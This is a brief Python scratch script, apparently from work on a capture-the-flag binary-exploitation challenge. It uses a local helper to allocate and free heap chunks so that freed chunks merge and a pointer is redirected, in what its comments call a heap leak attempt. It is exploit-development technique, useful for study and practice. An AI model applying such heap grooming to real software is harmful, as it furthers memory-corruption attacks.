import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
# two independent forward-merge 0x120 chunks; point CC->next to first; check fd
# groom pattern that gave CC->next=&YY ; do the same but create an extra 0x120 freed first
# create YY2 merge first (free a pair), then the CC groom targeting YY1
g.add(b'P1'); g.add(b'Q1'); g.make(b'bp'); # P1,Q1 adjacent + bar
g.rm(b'Q1'); g.rm(b'P1')  # merge P1+Q1 -> 0x120 freed (YY2-ish)
# now main groom
g.add(b'A1'); g.add(b'B2'); g.make(b'b1'); g.add(b'YY'); g.add(b'Z9'); g.make(b'b3')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.dump('two-merge heap leak attempt')
g.close()
